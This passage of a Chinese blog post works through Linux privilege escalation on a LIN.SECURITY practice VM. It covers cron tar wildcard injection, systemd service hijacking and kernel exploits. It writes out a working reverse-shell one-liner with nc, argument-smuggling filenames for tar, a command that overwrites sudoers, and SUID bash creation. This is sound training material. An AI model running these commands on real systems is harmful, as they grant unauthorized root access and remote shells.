class="keyword">var</span>/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /<span class="keyword">var</span>/spool/cron;</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592817734754.png" alt="1592817734754"></p>
+<p>cron的⽇志⽂件存储为 /var/log/cronlog ，可以看到最近执⾏的定时任务信息</p>
+<blockquote>
+<p>相关信息</p>
+<ul>
+<li>配置文件读取路径</li>
+</ul>
+<ol>
+<li><p>/var/spool/cron/ , 由crontab -e 进行写入，配置文件无需指定用户；用户创建的任务在</p>
+<p>对应用户名文件夹下。 </p>
+</li>
+<li><p>/etc/crontab ，只能root 进行编辑，配置文件需指定用户</p>
+</li>
+<li><p>/etc/cron.d/ ,在此文件夹下创建定时任务文件（和 /etc/crontab 一样）</p>
+</li>
+</ol>
+<ul>
+<li>日志保存地址：/var/log/cron；要禁止某个用户使用，将用户名添加到 /etc/cron.deny文件中。 </li>
+</ul>
+</blockquote>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>通配符是一种特殊语句，主要有型号（*）和问号（？），用来对字符串进行模糊匹配（比如文件名，参数名）。当查找文件夹时，可以使用它来代替一个或多个真正字符；当不知道真正字符或懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符。</p>
+<blockquote>
+<p><strong>*</strong>  代表任意多个字符</p>
+<p><strong>?</strong>  代表任意单个字符</p>
+<p><strong>[ ]</strong> 代表”[“和”]”之间的某一个字符，比如[0-9]可以代表0-9之间的任意一个数字，[a-zA-Z]可以代表a-z和A-Z之间的任意一个字母，字母区分大小写。</p>
+<p><strong>–</strong> 代表一个字符。</p>
+<p><strong>~</strong> 用户的根目录。</p>
+</blockquote>
+<p>利用通配符进行本地提权：<br><a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a></p>
+<h2 id="提权演示-3"><a href="#提权演示-3" class="headerlink" title="提权演示"></a>提权演示</h2><p>首先查看<code>/etc/crontab</code>的定时任务<br><img src="/2020/06/23/linux-tiquan/1592872154310.png" alt="1592872154310"></p>
+<p> 查看/etc/cron.daily/backup文件：</p>
+<p><img src="/2020/06/23/linux-tiquan/1592872228674.png" alt="1592872228674"></p>
+<p>时任务的执行权限是root，将用户家目录下的文件备份到/etc/backups/下，使用通配符<code>*</code><br><strong>反弹shell</strong><br>使用msfvenom生成反弹sell的一句话</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> lport=<span class="number">7777</span> R</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592872467958.png" alt="1592872467958"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/waqwv; nc <span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span> <span class="number">7777</span> <span class="number">0</span>&lt;/tmp/waqwv | /bin/sh &gt;/tmp/waqwv <span class="number">2</span>&gt;&amp;<span class="number">1</span>; rm /tmp/waqwv</span><br></pre></td></tr></table></figure>
+
+<p>之后将payload写入shell.sh，并赋予执行权限(  在tar处理的目录下写入shell.sh  )</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"mkfifo /tmp/waqwv; nc 192.168.211.151 7777 0&lt;/tmp/waqwv | /bin/sh &gt;/tmp/waqwv 2&gt;&amp;1; rm /tmp/waqwv"</span> &gt; shell.sh &amp;&amp; chmod +x shell.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#再创建两个文件</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint-action=exec=sh shell.sh"</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint=1"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592872807490.png" alt="1592872807490"></p>
+<p>最后使用nc监听7777端口等待定时任务执行即可<br><img src="/2020/06/23/linux-tiquan/1592872955100.png" alt="1592872955100"></p>
+<p>  实际上，定时任务执行的命令为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /etc/backups/home-bob.tgz *</span><br><span class="line">|</span><br><span class="line">|-&gt;</span><br><span class="line">	tar -zcf /etc/backups/home-bob.tgz --checkpoint=<span class="number">1</span> --checkpoint-action=exec=sh shell.sh shell.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>--checkpoint-action</code>选项：用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。 因此，选项<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh shell.sh</code>作为命令行选项交给了tar程序。</li>
+</ul>
+<p><strong>直接修改/etc/sudoers文件：</strong>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> &gt;shell.sh</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint-action=exec=sh shell.sh"</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">"--checkpoint=1"</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用工具：</strong><a href="https://github.com/localh0t/wildpwn" target="_blank" rel="noopener">wildpwn</a></p>
+<h1 id="system配置"><a href="#system配置" class="headerlink" title="system配置"></a>system配置</h1><h2 id="systemd简介"><a href="#systemd简介" class="headerlink" title="systemd简介"></a>systemd简介</h2><ul>
+<li><p>系统定时器，也是计划任务的⼀种 </p>
+<p>查询命令： <code>systemctl list-timers --all</code></p>
+</li>
+</ul>
+<p>相关信息： </p>
+<ol>
+<li><p>如果想使用systemd作为定时器，需要先创建一个服务单元，之后再创建计时器单元 </p>
+</li>
+<li><p>重新加载配置： <code>systemctl daemon-reload</code></p>
+</li>
+<li><p><code>journalctl -u mytimer</code>查看<code>mytimer.timer</code>和 <code>mytimer.service</code>的日志 </p>
+<p>详细原理：<a href="https://www.linuxidc.com/Linux/2019-05/158599.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2019-05/158599.htm</a> </p>
+</li>
+</ol>
+<p><img src="/2020/06/23/linux-tiquan/1592818118936.png" alt="1592818118936"></p>
+<p>一般我们通过一下命令来启动apache2服务</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/apache2 start</span><br><span class="line">或者</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+
+<p>但是这种方法有两个缺点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一是启动时间长。init进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 </span><br><span class="line">二是启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长</span><br></pre></td></tr></table></figure>
+
+<p>Systemd 就是为了解决这些问题而诞生的。它的设计目标是为系统的启动和管理提供一套完整的解决方案。 </p>
+<p>使用了 Systemd，就不需要再用init了。Systemd 取代了init.d，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。  </p>
+<p>Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。</p>
+<p>常用命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启系统</span></span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭系统，切断电源</span></span><br><span class="line">$ sudo systemctl poweroff</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 查看启动耗时</span></span><br><span class="line">$ systemd-analyze                                                                     </span><br><span class="line"><span class="comment"># 查看每个服务的启动耗时</span></span><br><span class="line">$ systemd-analyze blame</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 显示当前主机的信息</span></span><br><span class="line">$ hostnamectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主机名。</span></span><br><span class="line">$ sudo hostnamectl set-hostname rhel7</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权演示-4"><a href="#提权演示-4" class="headerlink" title="提权演示"></a>提权演示</h2><p>首先查看peter用户的systemd配置，发现peter拥有debug.service文件，并且具有读写权限</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whereis systemd</span><br><span class="line">ls -al /lib/systemd/system/debug.service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592904523563.png" alt="1592904523563"></p>
+<p><img src="/2020/06/23/linux-tiquan/1592904547093.png" alt="1592904547093"></p>
+<p>如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的.service文件并更改run()命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
+<p>查看.service文件</p>
+<p><img src="/2020/06/23/linux-tiquan/1592904662891.png" alt="1592904662891"></p>
+<p>这里需要修改ExecStart文件使得在程序开始时执行命令，除此之外还可以修改ExecStop和ExecReload来在停止和重启服务时执行命令</p>
+<p>接着让root身份来创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> -e <span class="string">'#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash'</span> &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#-e为换行显示</span></span><br></pre></td></tr></table></figure>
+
+<p>之后在修改debug.service文件来调用创建的脚本</p>
+<p><img src="/2020/06/23/linux-tiquan/1592905283872.png" alt="1592905283872"></p>
+<p>重启系统，再次连接</p>
+<p><img src="/2020/06/23/linux-tiquan/1592906242457.png" alt="1592906242457"></p>
+<p>之后使用suid提权即可获得root权限，<code>./systemdbash -p</code>就相当于是bash的suid提权</p>
+<p><img src="/2020/06/23/linux-tiquan/1592906414669.png" alt="1592906414669"></p>
+<p>可以将systemdexpl.sh的内容修改为将公钥写入/root/.ssh</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> -e <span class="string">'#!/bin/bash \ncp /home/peter/.ssh/* /root/.ssh/'</span> &gt; /home/peter/systemdexpl2.sh &amp;&amp; chmod +x systemdexpl2.sh</span><br><span class="line">    </span><br><span class="line"><span class="comment">#修改/lib/systemd/system/debug.service中的ExecStart为脚本路径</span></span><br><span class="line">vim /lib/systemd/system/debug.service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592906671750.png" alt="1592906671750"></p>
+<p>  重启系统之后直接使用root用户登录即可<br><img src="/2020/06/23/linux-tiquan/1592907110828.png" alt="1592907110828"></p>
+<h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><p>内核提权漏洞（依靠EXP） </p>
+<ol>
+<li><p>在exploit-db、或者其他搜索引擎上查找相关提权漏洞。 </p>
+</li>
+<li><p>利⽤脏⽜ ( 2.6.22&lt;=kernel &lt;= 4.8.3、4.7.9、4.4.26LTS ） </p>
+</li>
+<li><p>⼀般这种提权漏洞都是c的，需要gcc编译<code>gcc filename -o outfilename</code> 。 </p>
+</li>
+</ol>
+<p>内核漏洞搜集项⽬： </p>
+<p><a href="https://github.com/lucyoa/kernel-exploits/" target="_blank" rel="noopener">https://github.com/lucyoa/kernel-exploits/</a> </p>
+<p><a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits</a> </p>
+<p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a> 中⽂ NICE~ </p>
+<p><a href="https://github.com/xairy/kernel-exploits" target="_blank" rel="noopener">https://github.com/xairy/kernel-exploits</a> </p>
+<p><a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/" target="_blank" rel="noopener">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/</a> </p>
+<p>常⻅漏洞： </p>
+<ol>
+<li>CVE-2016-5195 (DirtyCow)：（Linux Kernel &lt;= 3.19.0-73.8） </li>
+</ol>
+<p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a> </p>
+<p><a href="https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c" target="_blank" rel="noopener">https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c</a> </p>
+<ol start="2">
+<li>CVE-2010-3904 (RDS)：（Linux Kernel &lt;= 2.6.36-rc8） </li>
+</ol>
+<p><a href="https://www.exploit-db.com/exploits/15285/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/15285/</a> </p>
+<ol start="3">
+<li>CVE-2010-4258 (Full Nelson)：（Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)） </li>
+</ol>
+<p><a href="https://www.exploit-db.com/exploits/15704/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/15704/</a> </p>
+<ol start="4">
+<li>CVE-2012-0056 (Mempodipper)：（Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)） </li>
+</ol>
+<p><a href="https://www.exploit-db.com/exploits/18411" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/18411</a> </p>
+<p>在linux中常见的几种提权方式就差不多是这些了，当然这些只是众多提权方法中的一些皮毛，要正真熟练掌握linux提权还需要多思考，多练习。</p>
+<h1 id="补充："><a href="#补充：" class="headerlink" title="补充："></a><strong>补充：</strong></h1><p>查看用户拥有的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user username <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>参考文章：<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#cron-jobs" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#cron-jobs</a></p>
+<p>参考文章：<br><a href="https://www.fenghlz.xyz/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/" target="_blank" rel="noopener">https://www.fenghlz.xyz/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/</a></p>
+<p>提权在线查询：<br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年06月26日 19:06:50<br>
+  <span>原始链接:</span><a href="/2020/06/23/linux-tiquan/" title="通过LIN.SECURITY靶机学习linux提权">https://cyzcc.vip/2020/06/23/linux-tiquan/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> Linux提权,靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/23/vulnhub-TommyBoy1dot0/" rel="next" title="vulnhub靶机-TommyBoy1dot0">
+                <i class="fa fa-chevron-left"></i> vulnhub靶机-TommyBoy1dot0
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/29/Os-hackNos-2/" rel="prev" title="vulnhub靶机Os-hackNos-2">
+                vulnhub靶机Os-hackNos-2 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机信息"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络配置-无法获取ip"><span class="nav-number">2.</span> <span class="nav-text">网络配置(无法获取ip)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一种情况："><span class="nav-number">2.1.</span> <span class="nav-text">第一种情况：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二种情况："><span class="nav-number">2.2.</span> <span class="nav-text">第二种情况：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#提权辅助工具"><span class="nav-number">3.</span> <span class="nav-text">提权辅助工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LinEnum"><span class="nav-number">3.1.</span> <span class="nav-text">LinEnum</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LinuxSmartEnumeration"><span class="nav-number">3.2.</span> <span class="nav-text">LinuxSmartEnumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BeRootProject"><span class="nav-number">3.3.</span> <span class="nav-text">BeRootProject</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sudo提权"><span class="nav-number">4.</span> <span class="nav-text">sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于sudo"><span class="nav-number">4.1.</span> <span class="nav-text">关于sudo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo的执行原理"><span class="nav-number">4.2.</span> <span class="nav-text">sudo的执行原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权演示"><span class="nav-number">4.3.</span> <span class="nav-text">提权演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUID提权"><span class="nav-number">5.</span> <span class="nav-text">SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是suid"><span class="nav-number">5.1.</span> <span class="nav-text">什么是suid</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suid提权原理"><span class="nav-number">5.2.</span> <span class="nav-text">suid提权原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权演示-1"><span class="nav-number">5.3.</span> <span class="nav-text">提权演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码相关"><span class="nav-number">6.</span> <span class="nav-text">密码相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#收集密码相关信息"><span class="nav-number">6.1.</span> <span class="nav-text">收集密码相关信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解-etc-passwd哈希"><span class="nav-number">6.2.</span> <span class="nav-text">破解/etc/passwd哈希</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-shadow"><span class="nav-number">6.3.</span> <span class="nav-text">/etc/shadow</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用可写入文件"><span class="nav-number">7.</span> <span class="nav-text">利用可写入文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索可写入文件"><span class="nav-number">7.1.</span> <span class="nav-text">搜索可写入文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-passwd-文件写入"><span class="nav-number">7.2.</span> <span class="nav-text">/etc/passwd 文件写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-sudoers文件写入"><span class="nav-number">7.3.</span> <span class="nav-text">/etc/sudoers文件写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权演示-2"><span class="nav-number">7.4.</span> <span class="nav-text">提权演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用隐藏文件"><span class="nav-number">8.</span> <span class="nav-text">利用隐藏文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NFS低权限访问"><span class="nav-number">9.</span> <span class="nav-text">NFS低权限访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NFS简介"><span class="nav-number">9.1.</span> <span class="nav-text">NFS简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机演示"><span class="nav-number">9.2.</span> <span class="nav-text">靶机演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用docker组提权"><span class="nav-number">10.</span> <span 